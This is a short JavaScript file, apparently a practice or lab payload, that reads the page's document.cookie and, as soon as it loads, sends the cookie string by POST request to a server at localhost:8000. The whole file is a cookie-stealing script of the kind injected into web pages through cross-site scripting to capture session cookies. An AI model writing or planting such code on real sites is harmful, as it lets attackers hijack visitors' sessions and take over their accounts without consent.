function getcookie()
{
    const cookie = document.cookie;
    return cookie;
    
}
function anything()
{
    let cookie = getcookie();
    if(cookie)
    {
        fetch(`http://localhost:8000/home`, {
        method: "post", // *GET, POST, PUT, DELETE, etc.
        mode: "cors",
        headers: {
            "Content-Type": "application/json",
            'Access-Control-Allow-Origin': '*'
        },
        body: JSON.stringify(cookie)
    })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        
        .catch(error => {
            console.error('There was a problem with the fetch operation:', error);
        });
}
}
anything()